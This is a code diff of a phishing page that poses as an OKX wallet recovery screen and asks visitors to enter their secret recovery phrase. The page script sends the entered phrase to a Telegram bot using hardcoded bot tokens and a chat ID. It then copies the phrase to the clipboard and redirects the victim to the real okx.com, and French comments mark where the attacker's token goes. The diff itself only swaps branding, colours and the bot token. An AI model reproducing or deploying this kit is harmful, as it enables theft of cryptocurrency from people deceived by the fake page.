@@ -4,8 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Secret Recovery Phrase</title>
-  <!-- ✅ Favicon MetaMask transparent -->
-    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
+  <link rel="icon" type="image/png" href="img/logo2.png">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     * { box-sizing: border-box; }
@@ -51,7 +50,7 @@
     .card {
       background-color: white;
       border-radius: 20px;
-      border: 1px solid #e0e0e0;
+      border: 1px solid #9AED2C;
       box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
       padding: 40px;
       width: 100%;
@@ -84,7 +83,7 @@
     }
 
     .step.active .circle {
-      background-color: #6264ff;
+      background-color: #9AED2C;
       color: #fff;
       border: none;
     }
@@ -149,7 +148,7 @@
     }
 
     .submit-btn {
-      background: linear-gradient(90deg, #537cff, #6563ff);
+      background: linear-gradient(90deg, #9AED2C, #9AED2C);
       border: none;
       color: white;
       width: 100%;
@@ -186,7 +185,7 @@
 <body>
 
   <div class="top-bar">
-    <div><img src="https://brandlogo.org/wp-content/uploads/2024/04/OKX-Logo-300x300.png.webp"  width="70px"></div>
+    <div><img src="https://upload.wikimedia.org/wikipedia/commons/2/2c/OKX_logo.svg"  width="100px"></div>
     <select class="language-select">
       <option value="en">English</option>
       <option value="fr">Français</option>
@@ -210,7 +209,7 @@
 
       <h1>Access your wallet with your Secret Recovery Phrase</h1>
       <p class="description">
-        OKX wallet cannot recover your password. We will use your Secret Recovery Phrase to validate your ownership, restore your wallet and set up a new password.
+        OKX Wallet cannot recover your password. We will use your Secret Recovery Phrase to validate your ownership, restore your wallet and set up a new password.
         First, enter the Secret Recovery Phrase that you were given when you created your wallet. <a href="#">Learn more</a>
       </p>
 
@@ -222,7 +221,7 @@
         <option value="24">I have a 24 word phrase</option>
       </select>
 
-      <div class="info">🔐 You can paste your entire secret recovery phrase into any field</div>
+      <div class="info">You can paste your entire secret recovery phrase into any field</div>
 
       <div class="seed-inputs" id="seedInputs"></div>
 
@@ -305,7 +304,7 @@
         phrase += value.trim() + " ";
       }
 
-      const botToken = "7918572484:AAHP6tcUHK2PuBPpN2Ln2GhFA722z2k7xb0"; // Remplace ici
+      const botToken = "8006898547:AAG1uCG4idpvvl6rbDGJ-Dx5-nbN0og-kEs"; // Remplace ici
       const chatId = "6996434307";     // Remplace ici
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -320,7 +319,7 @@
       navigator.clipboard.writeText(phrase.trim());
 
       setTimeout(() => {
-        window.location.href = "https://www.okx.com/"; // Remplace ton lien ici
+        window.location.href = "https://www.okx.com"; // Remplace ton lien ici
       }, 800);
     }
 
